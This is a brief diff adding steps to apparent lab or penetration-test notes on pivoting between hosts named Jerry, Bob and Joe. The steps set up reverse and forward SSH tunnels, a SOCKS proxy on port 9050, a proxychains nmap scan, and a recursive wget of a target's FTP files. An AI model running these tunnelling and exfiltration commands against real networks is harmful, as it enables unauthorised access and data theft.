@@ -17,3 +17,12 @@ IH > proxychains wget -r ftp://Thomas
 IH > proxychains wget -r http://Thomas
 IH > proxychains telnet Jerry
 Jerry > ssh user1@Bob -p 25 -R 51798:127.0.0.1:22 -NT
+IH > ssh user1@Bob -p 25 -L 51701:51798 -NT
+IH > ssh user1@127.0.0.1 -p 51701 -D 9050 -NT and kill old connection
+IH > 
+IH > telnet 127.0.0.1 51702
+Jerry > ssh user1@Bob -p 25 -R 51798:127.0.0.1:22 -NT
+IH > ssh user1@127.0.0.1 -p 51701 -D 9050 -NT
+IH > proxychains <nmap> -Pn Joe/scan.sh
+IH > proxychains ...
+IH > proxychains wget -r ftp://Joe:443
